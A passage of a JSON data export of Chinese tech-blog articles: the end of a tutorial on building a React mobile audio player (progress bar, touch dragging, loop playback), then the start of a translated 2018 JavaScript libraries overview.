class=\"hljs-attr\"\u003ecurrentTime\u003c/span\u003e}/${\u003cspan class=\"hljs-attr\"\u003ecurrentTotalTime\u003c/span\u003e} * ${\u003cspan class=\"hljs-attr\"\u003ethis.progressBar\u003c/span\u003e \u0026amp;\u0026amp; \u003cspan class=\"hljs-attr\"\u003ethis.progressBar.clientWidth\u003c/span\u003e}\u003cspan class=\"hljs-attr\"\u003epx\u003c/span\u003e)` }}\u0026gt;\u003c/span\u003e\u003cspan class=\"hljs-tag\"\u003e\u0026lt;/\u003cspan class=\"hljs-name\"\u003ediv\u003c/span\u003e\u0026gt;\u003c/span\u003e\n    \u003cspan class=\"hljs-tag\"\u003e\u0026lt;/\u003cspan class=\"hljs-name\"\u003ediv\u003c/span\u003e\u0026gt;\u003c/span\u003e\n    \u003cspan class=\"hljs-tag\"\u003e\u0026lt;\u003cspan class=\"hljs-name\"\u003ediv\u003c/span\u003e \u003cspan class=\"hljs-attr\"\u003eclassName\u003c/span\u003e=\u003cspan class=\"hljs-string\"\u003e\"audio-progress-point-area\"\u003c/span\u003e \u003cspan class=\"hljs-attr\"\u003eref\u003c/span\u003e=\u003cspan class=\"hljs-string\"\u003e{(point)\u003c/span\u003e =\u0026gt;\u003c/span\u003e { this.audioPoint = point }} style={{ left: left + 'px' }}\u0026gt;\n        \u003cspan class=\"hljs-tag\"\u003e\u0026lt;\u003cspan class=\"hljs-name\"\u003ediv\u003c/span\u003e \u003cspan class=\"hljs-attr\"\u003eclassName\u003c/span\u003e=\u003cspan class=\"hljs-string\"\u003e\"audio-progress-point\"\u003c/span\u003e\u0026gt;\u003c/span\u003e\n\n        \u003cspan class=\"hljs-tag\"\u003e\u0026lt;/\u003cspan class=\"hljs-name\"\u003ediv\u003c/span\u003e\u0026gt;\u003c/span\u003e\n    \u003cspan class=\"hljs-tag\"\u003e\u0026lt;/\u003cspan class=\"hljs-name\"\u003ediv\u003c/span\u003e\u0026gt;\u003c/span\u003e\n\u003cspan class=\"hljs-tag\"\u003e\u0026lt;/\u003cspan class=\"hljs-name\"\u003ediv\u003c/span\u003e\u0026gt;\u003c/span\u003e\n\u003cspan class=\"hljs-comment\"\u003e\u0026lt;!--进度条begin--\u0026gt;\u003c/span\u003e\n    \u003cspan class=\"hljs-tag\"\u003e\u0026lt;\u003cspan class=\"hljs-name\"\u003ediv\u003c/span\u003e \u003cspan class=\"hljs-attr\"\u003eclassName\u003c/span\u003e=\u003cspan class=\"hljs-string\"\u003e\"audio-timer\"\u003c/span\u003e\u0026gt;\u003c/span\u003e\n        \u003cspan class=\"hljs-tag\"\u003e\u0026lt;\u003cspan class=\"hljs-name\"\u003ep\u003c/span\u003e\u0026gt;\u003c/span\u003e{this.renderPlayTime(currentTime)}\u003cspan class=\"hljs-tag\"\u003e\u0026lt;/\u003cspan class=\"hljs-name\"\u003ep\u003c/span\u003e\u0026gt;\u003c/span\u003e\n        \u003cspan class=\"hljs-tag\"\u003e\u0026lt;\u003cspan class=\"hljs-name\"\u003ep\u003c/span\u003e\u0026gt;\u003c/span\u003e{this.renderPlayTime(currentTotalTime)}\u003cspan class=\"hljs-tag\"\u003e\u0026lt;/\u003cspan class=\"hljs-name\"\u003ep\u003c/span\u003e\u0026gt;\u003c/span\u003e\n    \u003cspan class=\"hljs-tag\"\u003e\u0026lt;/\u003cspan class=\"hljs-name\"\u003ediv\u003c/span\u003e\u0026gt;\u003c/span\u003e\n\n    \u003cspan class=\"hljs-tag\"\u003e\u0026lt;\u003cspan class=\"hljs-name\"\u003ediv\u003c/span\u003e \u003cspan class=\"hljs-attr\"\u003eclassName\u003c/span\u003e=\u003cspan class=\"hljs-string\"\u003e\"audio-control\"\u003c/span\u003e\u0026gt;\u003c/span\u003e\n        \u003cspan class=\"hljs-tag\"\u003e\u0026lt;\u003cspan class=\"hljs-name\"\u003ediv\u003c/span\u003e \u003cspan class=\"hljs-attr\"\u003eclassName\u003c/span\u003e=\u003cspan class=\"hljs-string\"\u003e\"audio-control-pre\"\u003c/span\u003e\u0026gt;\u003c/span\u003e\n            \u003cspan class=\"hljs-tag\"\u003e\u0026lt;\u003cspan class=\"hljs-name\"\u003eimg\u003c/span\u003e \u003cspan class=\"hljs-attr\"\u003esrc\u003c/span\u003e=\u003cspan class=\"hljs-string\"\u003e{PreIcon}\u003c/span\u003e \u003cspan class=\"hljs-attr\"\u003ealt\u003c/span\u003e=\u003cspan class=\"hljs-string\"\u003e\"\"\u003c/span\u003e /\u0026gt;\u003c/span\u003e\n        \u003cspan class=\"hljs-tag\"\u003e\u0026lt;/\u003cspan class=\"hljs-name\"\u003ediv\u003c/span\u003e\u0026gt;\u003c/span\u003e\n        \u003cspan class=\"hljs-tag\"\u003e\u0026lt;\u003cspan class=\"hljs-name\"\u003ediv\u003c/span\u003e \u003cspan class=\"hljs-attr\"\u003eclassName\u003c/span\u003e=\u003cspan class=\"hljs-string\"\u003e\"audio-control-play\"\u003c/span\u003e\u0026gt;\u003c/span\u003e\n            \u003cspan class=\"hljs-tag\"\u003e\u0026lt;\u003cspan class=\"hljs-name\"\u003eimg\u003c/span\u003e \u003cspan class=\"hljs-attr\"\u003esrc\u003c/span\u003e=\u003cspan class=\"hljs-string\"\u003e{Play}\u003c/span\u003e \u003cspan class=\"hljs-attr\"\u003ealt\u003c/span\u003e=\u003cspan class=\"hljs-string\"\u003e\"\"\u003c/span\u003e /\u0026gt;\u003c/span\u003e\n        \u003cspan class=\"hljs-tag\"\u003e\u0026lt;/\u003cspan class=\"hljs-name\"\u003ediv\u003c/span\u003e\u0026gt;\u003c/span\u003e\n        \u003cspan class=\"hljs-tag\"\u003e\u0026lt;\u003cspan class=\"hljs-name\"\u003ediv\u003c/span\u003e \u003cspan class=\"hljs-attr\"\u003eclassName\u003c/span\u003e=\u003cspan class=\"hljs-string\"\u003e\"audio-control-next\"\u003c/span\u003e\u0026gt;\u003c/span\u003e\n            \u003cspan class=\"hljs-tag\"\u003e\u0026lt;\u003cspan class=\"hljs-name\"\u003eimg\u003c/span\u003e \u003cspan class=\"hljs-attr\"\u003esrc\u003c/span\u003e=\u003cspan class=\"hljs-string\"\u003e{NextIcon}\u003c/span\u003e \u003cspan class=\"hljs-attr\"\u003ealt\u003c/span\u003e=\u003cspan class=\"hljs-string\"\u003e\"\"\u003c/span\u003e /\u0026gt;\u003c/span\u003e\n        \u003cspan class=\"hljs-tag\"\u003e\u0026lt;/\u003cspan class=\"hljs-name\"\u003ediv\u003c/span\u003e\u0026gt;\u003c/span\u003e\n    \u003cspan class=\"hljs-tag\"\u003e\u0026lt;/\u003cspan class=\"hljs-name\"\u003ediv\u003c/span\u003e\u0026gt;\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e进度条的大致原理就是获取音频的\u003cstrong\u003e当前播放时长\u003c/strong\u003e以及\u003cstrong\u003e音频总时长\u003c/strong\u003e的比例，然后通过这个比例与进度条宽度相乘，可以得到当前播放时长下进度条需要被填充的宽度。\u003c/p\u003e\n\u003cp\u003e代码中的“audio-progress-bar-preload”是用来做缓冲条的，大概的做法也是一样，不过获取缓冲进度得用到audio的buffered属性，具体的用法推荐大家去MDN看看，在这里就不多赘述。\u003c/p\u003e\n\u003cp\u003e进度条以及播放按钮的布局代码大概就是这样，在css方面需要注意的就是进度条容器与进度条填充块以及进度条触点间的层级关系就好。\u003c/p\u003e\n\u003ch2 class=\"heading\"\u003e播放器功能逻辑\u003c/h2\u003e\n\u003cp\u003e也许看了上面，大家觉得很疑惑，为什么没有见到最关键的audio标签。那是因为，其实整个播放器的逻辑重点都在那个标签里，我们需要单独抽出来分析一下。\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs html\" lang=\"html\"\u003e\u003cspan class=\"hljs-tag\"\u003e\u0026lt;\u003cspan class=\"hljs-name\"\u003eaudio\u003c/span\u003e \n    \u003cspan class=\"hljs-attr\"\u003epreload\u003c/span\u003e=\u003cspan class=\"hljs-string\"\u003e\"metadata\"\u003c/span\u003e \n    \u003cspan class=\"hljs-attr\"\u003esrc\u003c/span\u003e=\u003cspan class=\"hljs-string\"\u003e{src}\u003c/span\u003e \n    \u003cspan class=\"hljs-attr\"\u003eref\u003c/span\u003e=\u003cspan class=\"hljs-string\"\u003e{(audio)\u003c/span\u003e =\u0026gt;\u003c/span\u003e {this.lectureAudio = audio}} \n    style={{width: '1px', height: '1px', visibility: 'hidden'}} \n    onCanPlay={() =\u0026gt; this.handleAudioCanplay()}\n    onTimeUpdate={() =\u0026gt; this.handleTimeUpdate()}\u0026gt;\n\u003cspan class=\"hljs-tag\"\u003e\u0026lt;/\u003cspan class=\"hljs-name\"\u003eaudio\u003c/span\u003e\u0026gt;\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003ch3 class=\"heading\"\u003e① 怎么让进度条动起来？\u003c/h3\u003e\n\u003cp\u003e解决思路--音频在播放的时候，当前进度(currentTime)是一直都在变化的，也就是说，能找到一个将currentTime变化具现为进度条长度的常数是关键。说的这么复杂，其实在上面的布局代码里已经剧透了，\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003ecalc(\u003cspan class=\"hljs-variable\"\u003e${currentTime}\u003c/span\u003e/\u003cspan class=\"hljs-variable\"\u003e${currentTotalTime}\u003c/span\u003e * \u003cspan class=\"hljs-variable\"\u003e$this\u003c/span\u003e.progressBar.clientWidth}px\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e这样就能很轻松的算出当前进度需要对应的进度条填充长度。问题又来了，我知道进度条该填充多长了，但是它还是不会动额...\n在这里，我们有两个方法可以解决：\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e利用setInterval\n我们可以每隔300ms就检测一下当前audio的currentTime，然后在setState动态改变state中的currentTime，接着组件便会重渲染进度条部分的展示，从而也就让我们的进度条动起来了。\u003c/li\u003e\n\u003cli\u003e利用audio的ontimeupdate事件\n这个是audio和video都拥有的原生事件，作用是--“当currentTime更新时会触发timeupdate事件”，一般推荐使用这种方式来动态计算进度条的宽度，毕竟可以少写一个计时器，说不定可以规避一些项目中的隐患。而且这是HTML的原生事件，浏览器的支持肯定是充分的，所以从性能的角度来说应该是比上一种方式要好。\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003eontimeupdate时执行的方法--每次触发该事件时都重新给currentTime赋值，剩下的改动都可以通过currentTime值的变化而做出相应的变化。\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs js\" lang=\"js\"\u003ehandleTimeUpdate() {\n    \u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e (\u003cspan class=\"hljs-keyword\"\u003ethis\u003c/span\u003e.state.currentTime \u0026lt; (\u003cspan class=\"hljs-keyword\"\u003ethis\u003c/span\u003e.state.currentTotalTime - \u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e)) {\n        \u003cspan class=\"hljs-keyword\"\u003ethis\u003c/span\u003e.setState({\n            \u003cspan class=\"hljs-attr\"\u003ecurrentTime\u003c/span\u003e: \u003cspan class=\"hljs-keyword\"\u003ethis\u003c/span\u003e.lectureAudio.currentTime\n        });\n    } \u003cspan class=\"hljs-keyword\"\u003eelse\u003c/span\u003e {\n        ......\n    }\n}\n\u003c/code\u003e\u003c/pre\u003e\u003ch3 class=\"heading\"\u003e② 怎么在移动端拖动进度条？\u003c/h3\u003e\n\u003cp\u003e解决思路--既然是移动端的触碰事件，那么touch事件自然就是主角了。通过touch事件我们可以计算出，拖动的距离，进而得到进度条以及触点该移动的距离。\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs js\" lang=\"js\"\u003einitListenTouch() {\n    \u003cspan class=\"hljs-keyword\"\u003ethis\u003c/span\u003e.audioPoint.addEventListener(\u003cspan class=\"hljs-string\"\u003e'touchstart'\u003c/span\u003e, (e) =\u0026gt; \u003cspan class=\"hljs-keyword\"\u003ethis\u003c/span\u003e.pointStart(e), \u003cspan class=\"hljs-literal\"\u003efalse\u003c/span\u003e);\n    \u003cspan class=\"hljs-keyword\"\u003ethis\u003c/span\u003e.audioPoint.addEventListener(\u003cspan class=\"hljs-string\"\u003e'touchmove'\u003c/span\u003e, (e) =\u0026gt; \u003cspan class=\"hljs-keyword\"\u003ethis\u003c/span\u003e.pointMove(e), \u003cspan class=\"hljs-literal\"\u003efalse\u003c/span\u003e);\n    \u003cspan class=\"hljs-keyword\"\u003ethis\u003c/span\u003e.audioPoint.addEventListener(\u003cspan class=\"hljs-string\"\u003e'touchend'\u003c/span\u003e, (e) =\u0026gt; \u003cspan class=\"hljs-keyword\"\u003ethis\u003c/span\u003e.pointEnd(e), \u003cspan class=\"hljs-literal\"\u003efalse\u003c/span\u003e);\n}\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e这是组件加载时挂在到进度条触点的三个事件监听，这里讲一下三个监听具体都有些什么作用。\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003etouchstart--负责获取触摸进度触点时触点的方位\u003c/li\u003e\n\u003c/ul\u003e\n\u003cpre\u003e\u003ccode class=\"hljs js\" lang=\"js\"\u003epointStart(e) {\n    e.preventDefault();\n    \u003cspan class=\"hljs-keyword\"\u003elet\u003c/span\u003e touch = e.touches[\u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e];\n    \u003cspan class=\"hljs-keyword\"\u003ethis\u003c/span\u003e.lectureAudio.pause();\n    \u003cspan class=\"hljs-comment\"\u003e//为了更好的体验，在移动触点的时候我选择将音频暂停\u003c/span\u003e\n    \u003cspan class=\"hljs-keyword\"\u003ethis\u003c/span\u003e.setState({\n        \u003cspan class=\"hljs-attr\"\u003eisPlaying\u003c/span\u003e: \u003cspan class=\"hljs-literal\"\u003efalse\u003c/span\u003e,\u003cspan class=\"hljs-comment\"\u003e//播放按钮变更\u003c/span\u003e\n        startX: touch.pageX\u003cspan class=\"hljs-comment\"\u003e//进度触点在页面中的x坐标\u003c/span\u003e\n    });\n}\n\u003c/code\u003e\u003c/pre\u003e\u003cul\u003e\n\u003cli\u003etouchmove--负责动态计算触点的拖动距离，并转换成this.state.currentTime从而触发组件的重渲染.\u003c/li\u003e\n\u003c/ul\u003e\n\u003cpre\u003e\u003ccode class=\"hljs js\" lang=\"js\"\u003epointMove(e) {\n    e.preventDefault();\n    \u003cspan class=\"hljs-keyword\"\u003elet\u003c/span\u003e touch = e.touches[\u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e];\n    \u003cspan class=\"hljs-keyword\"\u003elet\u003c/span\u003e x = touch.pageX - \u003cspan class=\"hljs-keyword\"\u003ethis\u003c/span\u003e.state.startX; \u003cspan class=\"hljs-comment\"\u003e//滑动的距离\u003c/span\u003e\n    \u003cspan class=\"hljs-keyword\"\u003elet\u003c/span\u003e maxMove = \u003cspan class=\"hljs-keyword\"\u003ethis\u003c/span\u003e.progressBar.clientWidth;\u003cspan class=\"hljs-comment\"\u003e//最大的移动距离不可超过进度条宽度\u003c/span\u003e\n\n    \u003cspan class=\"hljs-comment\"\u003e//(this.state.moveX) = this.lectureAudio.duration / this.progressBar.clientWidth;\u003c/span\u003e\n    \u003cspan class=\"hljs-comment\"\u003e//moveX是一个固定的常数，它代表着进度条宽度与音频总时长的关系，我们可以通过获取触点移动的距离从而计算出此时对应的currentTime\u003c/span\u003e\n    \u003cspan class=\"hljs-comment\"\u003e//下面是触点移动时会碰到的情况，分为正移动、负移动以及两端的极限移动。\u003c/span\u003e\n    \u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e (x \u0026gt;= \u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e) {\n        \u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e (x + \u003cspan class=\"hljs-keyword\"\u003ethis\u003c/span\u003e.state.startX - \u003cspan class=\"hljs-keyword\"\u003ethis\u003c/span\u003e.offsetWindowLeft \u0026gt;= maxMove) {\n            \u003cspan class=\"hljs-keyword\"\u003ethis\u003c/span\u003e.setState({\n                \u003cspan class=\"hljs-attr\"\u003ecurrentTime\u003c/span\u003e: \u003cspan class=\"hljs-keyword\"\u003ethis\u003c/span\u003e.state.currentTotalTime,\n                \u003cspan class=\"hljs-comment\"\u003e//改变当前播放时间的数值\u003c/span\u003e\n            }, () =\u0026gt; {\n                \u003cspan class=\"hljs-keyword\"\u003ethis\u003c/span\u003e.lectureAudio.currentTime = \u003cspan class=\"hljs-keyword\"\u003ethis\u003c/span\u003e.state.currentTime;\n                \u003cspan class=\"hljs-comment\"\u003e//改变audio真正的播放时间\u003c/span\u003e\n            })\n        } \u003cspan class=\"hljs-keyword\"\u003eelse\u003c/span\u003e {\n            \u003cspan class=\"hljs-keyword\"\u003ethis\u003c/span\u003e.setState({\n                \u003cspan class=\"hljs-attr\"\u003ecurrentTime\u003c/span\u003e: (x + \u003cspan class=\"hljs-keyword\"\u003ethis\u003c/span\u003e.state.startX - \u003cspan class=\"hljs-keyword\"\u003ethis\u003c/span\u003e.offsetWindowLeft) * \u003cspan class=\"hljs-keyword\"\u003ethis\u003c/span\u003e.state.moveX\n            }, () =\u0026gt; {\n                \u003cspan class=\"hljs-keyword\"\u003ethis\u003c/span\u003e.lectureAudio.currentTime = \u003cspan class=\"hljs-keyword\"\u003ethis\u003c/span\u003e.state.currentTime;\n            })\n        }\n    } \u003cspan class=\"hljs-keyword\"\u003eelse\u003c/span\u003e {\n        \u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e (-x \u0026lt;= \u003cspan class=\"hljs-keyword\"\u003ethis\u003c/span\u003e.state.startX - \u003cspan class=\"hljs-keyword\"\u003ethis\u003c/span\u003e.offsetWindowLeft) {\n            \u003cspan class=\"hljs-keyword\"\u003ethis\u003c/span\u003e.setState({\n                \u003cspan class=\"hljs-attr\"\u003ecurrentTime\u003c/span\u003e: (\u003cspan class=\"hljs-keyword\"\u003ethis\u003c/span\u003e.state.startX + x - \u003cspan class=\"hljs-keyword\"\u003ethis\u003c/span\u003e.offsetWindowLeft) * \u003cspan class=\"hljs-keyword\"\u003ethis\u003c/span\u003e.state.moveX,\n            }, () =\u0026gt; {\n                \u003cspan class=\"hljs-keyword\"\u003ethis\u003c/span\u003e.lectureAudio.currentTime = \u003cspan class=\"hljs-keyword\"\u003ethis\u003c/span\u003e.state.currentTime;\n            })\n        } \u003cspan class=\"hljs-keyword\"\u003eelse\u003c/span\u003e {\n            \u003cspan class=\"hljs-keyword\"\u003ethis\u003c/span\u003e.setState({\n                \u003cspan class=\"hljs-attr\"\u003ecurrentTime\u003c/span\u003e: \u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e\n            }, () =\u0026gt; {\n                \u003cspan class=\"hljs-keyword\"\u003ethis\u003c/span\u003e.lectureAudio.currentTime = \u003cspan class=\"hljs-keyword\"\u003ethis\u003c/span\u003e.state.currentTime;\n            })\n        }\n    }\n}\n\u003c/code\u003e\u003c/pre\u003e\u003cul\u003e\n\u003cli\u003etouchend--负责恢复音频的播放\u003c/li\u003e\n\u003c/ul\u003e\n\u003cpre\u003e\u003ccode class=\"hljs js\" lang=\"js\"\u003epointEnd(e) {\n    e.preventDefault();\n    \u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e (\u003cspan class=\"hljs-keyword\"\u003ethis\u003c/span\u003e.state.currentTime \u0026lt; \u003cspan class=\"hljs-keyword\"\u003ethis\u003c/span\u003e.state.currentTotalTime) {\n        \u003cspan class=\"hljs-keyword\"\u003ethis\u003c/span\u003e.touchendPlay = setTimeout(\u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-params\"\u003e()\u003c/span\u003e =\u0026gt;\u003c/span\u003e {\n            \u003cspan class=\"hljs-keyword\"\u003ethis\u003c/span\u003e.handleAudioPlay();\n        }, \u003cspan class=\"hljs-number\"\u003e300\u003c/span\u003e)\n    }\n    \u003cspan class=\"hljs-comment\"\u003e//关于300ms的setTimeout，一是为了体验的良好，大家在做的时候可以试试不要300ms的延迟，会发现收听体验不好，音频的播放十分仓促。\u003c/span\u003e\n    \u003cspan class=\"hljs-comment\"\u003e//另外还有一点是，audio的pause与play间隔过短会出现报错，导致audio无法准确的执行相应的动作。\u003c/span\u003e\n}\n\u003c/code\u003e\u003c/pre\u003e\u003ch3 class=\"heading\"\u003e③ 怎么实现列表播放与循环播放？\u003c/h3\u003e\n\u003cp\u003e解决思路--时刻关注currentTime与duration之间的关系\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs js\" lang=\"js\"\u003ehandleTimeUpdate() {\n        \u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e (\u003cspan class=\"hljs-keyword\"\u003ethis\u003c/span\u003e.state.currentTime \u0026lt; (\u003cspan class=\"hljs-keyword\"\u003ethis\u003c/span\u003e.state.currentTotalTime - \u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e)){\n            ......\n        }\u003cspan class=\"hljs-keyword\"\u003eelse\u003c/span\u003e {\n            \u003cspan class=\"hljs-comment\"\u003e//此情况为音频已播放至最后\u003c/span\u003e\n            \u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e (\u003cspan class=\"hljs-keyword\"\u003ethis\u003c/span\u003e.state.isLooping){\u003cspan class=\"hljs-comment\"\u003e//是否为循环播放\u003c/span\u003e\n            \u003cspan class=\"hljs-comment\"\u003e//currentTime归零，并且手动将audio的currentTime设为0，并手动执行play()\u003c/span\u003e\n                \u003cspan class=\"hljs-keyword\"\u003ethis\u003c/span\u003e.setState({\n                    \u003cspan class=\"hljs-attr\"\u003ecurrentTime\u003c/span\u003e: \u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e\n                }, () =\u0026gt; {\n                    \u003cspan class=\"hljs-keyword\"\u003ethis\u003c/span\u003e.lectureAudio.currentTime = \u003cspan class=\"hljs-keyword\"\u003ethis\u003c/span\u003e.state.currentTime;\n                    \u003cspan class=\"hljs-keyword\"\u003ethis\u003c/span\u003e.lectureAudio.play();\n                })\n            }\u003cspan class=\"hljs-keyword\"\u003eelse\u003c/span\u003e {\n                \u003cspan class=\"hljs-comment\"\u003e//列表播放则只需判断是否有下一首，有则跳转或播放，无则暂停播放。\u003c/span\u003e\n                \u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e (\u003cspan class=\"hljs-keyword\"\u003ethis\u003c/span\u003e.props.audioInfo.next_lecture_id \u0026amp;\u0026amp; \u003cspan class=\"hljs-keyword\"\u003ethis\u003c/span\u003e.state.currentTime !== \u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e){\n                    \u003cspan class=\"hljs-keyword\"\u003ethis\u003c/span\u003e.handleNextLecture();\n                }\u003cspan class=\"hljs-keyword\"\u003eelse\u003c/span\u003e {\n                    \u003cspan class=\"hljs-keyword\"\u003ethis\u003c/span\u003e.handleAudioPause();\n                }\n            }\n        }\n    }\n\u003c/code\u003e\u003c/pre\u003e\u003ch2 class=\"heading\"\u003e总结\u003c/h2\u003e\n\u003cp\u003e不知道大家看完之后有没一种感觉，好像无论是什么都离不开this.state中的currentTime。\u003c/p\u003e\n\u003cp\u003e是的，这个播放器的核心就是currentTime，这也是开发时的刻意为之，最后我们会发现这个组件中的唯一变量就是currentTime，我们可以通过currentTime的变化完成所有的需求，并且不需要考虑其他因素的影响，因为所有的子组件都是围绕着currentTime运转。\u003c/p\u003e\n\u003cp\u003e以上是我关于播放器开发的一点小心得，虽然没有十分酷炫的皮肤，也没有十分复杂的功能，但是对个人而言，它很好的帮我理清了一个[可用的]播放器的开发流程。\u003c/p\u003e\n\u003cimg width=\"50%\" src=\"https://user-gold-cdn.xitu.io/2017/12/24/16087d7ac487f37c?w=375\u0026amp;h=524\u0026amp;f=png\u0026amp;s=118753\"\u003e\n","buildTime":"1515150299.2006","__v":0}
{"_id":{"$oid":"5a4f5f6218646e1ee8be9901"},"id":"5a4e23f0f265da3e377bce4f","author":{"$oid":"5a4f5f6218646e1ee8be98e7"},"imageCache":[{"imageUrlArray":["https://user-gold-cdn.xitu.io/2018/1/4/160c13ce11c0ad15?w=2000\u0026h=1333\u0026f=jpeg\u0026s=734849","https://user-gold-cdn.xitu.io/2018/1/4/160c13ce1128119e?w=591\u0026h=425\u0026f=png\u0026s=52943","https://user-gold-cdn.xitu.io/2018/1/4/160c13ce10806b8d?w=800\u0026h=250\u0026f=png\u0026s=37344","https://user-gold-cdn.xitu.io/2018/1/4/160c13ce5ba3b355?w=800\u0026h=329\u0026f=png\u0026s=32243","https://user-gold-cdn.xitu.io/2018/1/4/160c13ce89a83ff0?w=800\u0026h=328\u0026f=png\u0026s=31243","https://user-gold-cdn.xitu.io/2018/1/4/160c13cf5cd2cd33?w=800\u0026h=317\u0026f=png\u0026s=30521","https://user-gold-cdn.xitu.io/2018/1/4/160c13ce4bf0fffe?w=800\u0026h=479\u0026f=png\u0026s=15025","https://user-gold-cdn.xitu.io/2018/1/4/160c13ce11faa27d?w=605\u0026h=352\u0026f=png\u0026s=10073","https://user-gold-cdn.xitu.io/2017/12/10/160409bd95f267df?w=800\u0026h=450\u0026f=png\u0026s=366761"],"screenShot":null}],"title":"[译] 2018 要学习的优秀 JavaScript 库与知识","meta":{"likeCount":0},"tag":["掘金翻译计划","前端","JavaScript"],"comment":[],"shortContent":"去年，我写了一篇关于 2017 需要学习的技术 的文章。今年有一些惊喜。 JavaScript 有最多的包，取得压倒性\u0008胜利。 首先，软件吞噬了世界，web 吞噬了软件，同时 JavaScript 吞噬了 web。而在 2018 年，React 正在吞噬 JavaScript。…","content":"\u003cblockquote\u003e\n\u003cul\u003e\n\u003cli\u003e原文地址：\u003ca target=\"_blank\" href=\"https://medium.com/javascript-scene/top-javascript-libraries-tech-to-learn-in-2018-c38028e028e6\"\u003eTop JavaScript Libraries \u0026amp; Tech to Learn in 2018\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e原文作者：\u003ca target=\"_blank\" href=\"https://medium.com/@_ericelliott?source=post_header_lockup\"\u003eEric Elliott\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e译文出自：\u003ca target=\"_blank\" href=\"https://github.com/xitu/gold-miner\"\u003e掘金翻译计划\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e本文永久链接：\u003ca target=\"_blank\" href=\"https://github.com/xitu/gold-miner/blob/master/TODO/top-javascript-libraries-tech-to-learn-in-2018.md\"\u003ehttps://github.com/xitu/gold-miner/blob/master/TODO/top-javascript-libraries-tech-to-learn-in-2018.md\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e译者：\u003ca target=\"_blank\" href=\"https://github.com/gy134340\"\u003egy134340\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e校对者：\u003ca target=\"_blank\" href=\"https://github.com/moods445\"\u003emoods445\u003c/a\u003e, \u003ca target=\"_blank\" href=\"https://github.com/vuuihc\"\u003evuuihc\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/blockquote\u003e\n\u003cp\u003e\u003c/p\u003e\u003cfigure\u003e\u003cimg src=\"https://user-gold-cdn.xitu.io/2018/1/4/160c13ce11c0ad15?w=2000\u0026amp;h=1333\u0026amp;f=jpeg\u0026amp;s=734849\"\u003e\u003cfigcaption\u003e\u003c/figcaption\u003e\u003c/figure\u003e\u003cp\u003e\u003c/p\u003e\n\u003cp\u003eAlex Proimos — 纽约公共图书馆自修室 (CC BY 2.0)\u003c/p\u003e\n\u003cp\u003e去年，我写了一篇关于 \u003ca target=\"_blank\" href=\"https://medium.com/javascript-scene/top-javascript-frameworks-topics-to-learn-in-2017-700a397b711\"\u003e2017 需要学习的技术\u003c/a\u003e 的文章。今年有一些惊喜。\u003c/p\u003e\n\u003cblockquote\u003e\n\u003cp\u003e我们致力于回答 “\u0008在你投资学习的时候，哪些最高效\u0008？” 的问题\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cp\u003e\u003c/p\u003e\u003cfigure\u003e\u003cimg src=\"https://user-gold-cdn.xitu.io/2018/1/4/160c13ce1128119e?w=591\u0026amp;h=425\u0026amp;f=png\u0026amp;s=52943\"\u003e\u003cfigcaption\u003e\u003c/figcaption\u003e\u003c/figure\u003e\u003cp\u003e\u003c/p\u003e\n\u003cp\u003eJavaScript 有最多的包，取得压倒性\u0008胜利。\u003c/p\u003e\n\u003cp\u003e首先，软件吞噬了世界，web 吞噬了软件，同时 JavaScript 吞噬了 web。而在 2018 年，React 正在吞噬 JavaScript。\u003c/p\u003e\n\u003ch3 class=\"heading\"\u003e2018: React 之年\u003c/h3\u003e\n\u003cp\u003eReact 在 2017 年赢得了人气之战。\u003c/p\u003e\n\u003cp\u003e从 Google 趋势可以看出，还是有很多开发者基于 Angular \u0008开发：\u003c/p\u003e\n\u003cp\u003e\u003c/p\u003e\u003cfigure\u003e\u003cimg src=\"https://user-gold-cdn.xitu.io/2018/1/4/160c13ce10806b8d?w=800\u0026amp;h=250\u0026amp;f=png\u0026amp;s=37344\"\u003e\u003cfigcaption\u003e\u003c/figcaption\u003e\u003c/figure\u003e\u003cp\u003e\u003c/p\u003e\n\u003cp\u003e但是 React 持续的赢得用户满意度。它迅速增长\u0008并远远抛开 Angular (以及其他) 框架。\u003c/p\u003e\n\u003ch4 class=\"heading\"\u003eVue.js 呢? 我听说它很火\u003c/h4\u003e\n\u003cp\u003e每个人都喜欢口头上谈及相关的替代选项，比如 Vue.js。这是我去年说的：\u003c/p\u003e\n\u003cblockquote\u003e\n\u003cp\u003e\u003ca target=\"_blank\" href=\"https://vuejs.org/\"\u003e\u003cstrong\u003eVue.js\u003c/strong\u003e\u003c/a\u003e 有很多的 GitHub star 和下载量。如果情况继续发展的话，它在 2017 年将会表现的很好，但我不认为它会在下一年里\u0008替换 Angular 或者 React。所以在你学习 React 或者 Angular  